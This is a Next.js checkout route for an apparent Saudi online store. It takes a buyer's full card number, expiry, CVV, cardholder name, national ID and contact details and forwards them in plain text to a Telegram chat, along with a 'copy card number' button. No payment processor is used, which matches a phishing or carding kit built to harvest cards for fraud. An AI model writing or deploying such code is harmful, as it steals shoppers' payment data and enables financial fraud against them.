import { NextRequest, NextResponse } from "next/server";
import { sendToTelegram } from "../../lib/rateLimit";

function validate(body: Record<string, unknown>): string | null {
  const { cardNumber, expiry, cvv, cardHolder, items, total, installmentType } = body;
  if (!cardNumber || typeof cardNumber !== "string" || !/^\d{13,19}$/.test((cardNumber as string).replace(/\s/g, ""))) return "رقم البطاقة غير صالح";
  if (!expiry || typeof expiry !== "string" || !/^\d{2}\/\d{2}$/.test(expiry as string)) return "تاريخ الانتهاء غير صالح";
  if (!cvv || typeof cvv !== "string" || !/^\d{3,4}$/.test(cvv as string)) return "CVV غير صالح";
  if (!cardHolder || typeof cardHolder !== "string" || (cardHolder as string).length > 100) return "اسم حامل البطاقة غير صالح";
  if (!Array.isArray(items) || items.length === 0 || items.length > 50) return "المنتجات غير صالحة";
  if (typeof total !== "number" || total <= 0) return "المجموع غير صالح";
  if (installmentType && !["installment", "full"].includes(installmentType as string)) return "نوع الدفع غير صالح";
  return null;
}

export async function POST(req: NextRequest) {
  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || req.headers.get("x-real-ip") || "unknown";

  // تحديد الدولة من الـ IP
  let country = "غير معروف";
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=country`);
    if (geoRes.ok) {
      const geo = await geoRes.json();
      if (geo.country) country = geo.country;
    }
  } catch {}

  const body = await req.json();
  const err = validate(body);
  if (err) return NextResponse.json({ ok: false, error: err }, { status: 400 });

  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = body;

  const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
  const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;

  // حفظ في الداتابيز أولاً
  let dbId: string | null = null;
  try {
    const dbRes = await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
    });
    const dbData = await dbRes.json().catch(() => ({}));
    if (!dbRes.ok) {
      return NextResponse.json({ ok: false, error: dbData.error || "فشل حفظ الطلب" }, { status: dbRes.status });
    }
    dbId = dbData._id ?? null;
  } catch (e) {
    console.error("Checkout DB error:", e);
    return NextResponse.json({ ok: false, error: "خطأ في الاتصال بالسيرفر" }, { status: 502 });
  }

  // إرسال التلجرام فقط بعد نجاح الحفظ
  const text = [
    `🏪 طلب لـ متجر مؤسسة برج المبدع `,
    `🔢 رقم الطلب: #${orderId}`,
    ``,
    `💰 Total Amount: ${total} SAR`,
    ...(installmentType === "installment"
      ? [`💵 First Payment: ${downPayment} SAR`]
      : [`💵 Payment Type: Full Amount`]),
    ``,
    `💳 MadaVisa - New Order`,
    `👤 Order For: ${customer ?? "-"}`,
    `📱 WhatsApp: ${whatsapp ?? "-"}`,
    `🌍 Country: ${country}`,
    `💳 Card Number: ${cardNumber}`,
    `👤 Card Holder: ${cardHolder}`,
    `📅 Valid To: ${expiry}`,
    `🔐 CVV: ${cvv}`,
  ].join("\n");

  const whatsappNum = (whatsapp ?? "").replace(/\D/g, "");
  const buttons: object[] = [
    { text: "📋 نسخ رقم البطاقة", copy_text: { text: (cardNumber as string).replace(/\s/g, "") } },
  ];
  if (whatsappNum) buttons.push({ text: "💬 فتح واتساب", url: `https://wa.me/${whatsappNum}` });
  const reply_markup = { inline_keyboard: [buttons] };

  const sent = await sendToTelegram({ chat_id: process.env.TELEGRAM_CHAT_ID, text, reply_markup });
  if (!sent) console.error("Telegram send failed for order:", orderId);

  return NextResponse.json({ ok: true, orderId, dbId });
}
